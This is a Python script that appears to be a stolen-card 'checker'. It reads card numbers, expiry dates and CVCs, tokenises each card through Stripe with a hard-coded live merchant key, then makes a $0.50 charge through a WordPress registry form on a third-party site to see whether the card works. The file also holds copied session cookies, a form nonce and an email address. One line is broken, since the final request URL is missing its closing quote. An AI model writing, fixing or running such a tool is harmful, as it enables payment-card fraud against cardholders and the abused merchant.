import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F944bb046f5%3B+stripe-js-v3%2F944bb046f5%3B+card-element&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__cf_bm': 'tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw',
	    '_fbp': 'fb.2.1740399662778.157652016478123277',
	    'cookieyes-consent': 'consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
	    '_ga_59B60VWWYG': 'GS1.1.1740399662.1.0.1740399662.0.0.1057425111',
	    '_ga': 'GA1.1.1773205121.1740399663',
	    '__stripe_mid': '3ad59ee3-8640-4489-b958-19ff81a14c54f88403',
    '__stripe_sid': '51e56c80-8e2d-45ed-bd84-11c08a6392b350060f',
	    '_gcl_au': '1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	}
	
	headers = {
	    'authority': 'allcoughedup.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__cf_bm=tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw; _fbp=fb.2.1740399662778.157652016478123277; cookieyes-consent=consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _ga_59B60VWWYG=GS1.1.1740399662.1.0.1740399662.0.0.1057425111; _ga=GA1.1.1773205121.1740399663; __stripe_mid=f435ef71-f199-4863-9e2b-f51dd02b4b2731905d; __stripe_sid=65f16e25-cf7e-4d24-b7ac-3a8b2b0927fa020fce; _gcl_au=1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	    'origin': 'https://allcoughedup.com',
	    'referer': 'https://allcoughedup.com/registry/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1758787034927',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=4a5bc5a030&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=ZEE&email=ca.s.ton.g.v.a.y.didian.e%40gmail.com&custom-payment-amount=0.50&description=I%20love%20it&payment_method=stripe&__entry_intermediate_hash=2dca9b8ed82606eb178beecca9d0a034&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	r2 = requests.post('https://allcoughedup.com/wp-admin/admin-ajax.php, params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
